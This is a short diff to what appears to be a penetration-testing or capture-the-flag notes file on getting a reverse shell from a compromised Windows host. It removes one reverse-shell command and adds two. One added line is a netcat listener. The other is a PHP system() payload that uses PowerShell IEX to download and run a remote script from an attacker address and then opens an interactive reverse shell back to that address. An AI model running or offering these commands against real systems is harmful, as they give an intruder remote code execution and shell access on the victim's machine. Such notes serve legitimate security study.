@@ -116,7 +116,8 @@ If that doesn't work, you could have him connect back to us so that we could cra
 
 ```bash
 cat conpty.php
-system("powershell IEX(IWR http://10.10.14.8:8000/conpty.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 80");
+stty raw -echo; (stty size; cat) | nc -lvnp 8888
+system("powershell IEX(IWR http://10.10.14.11:53/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.11 8888");
 ```
 
 #### Inet Bind Shell ??
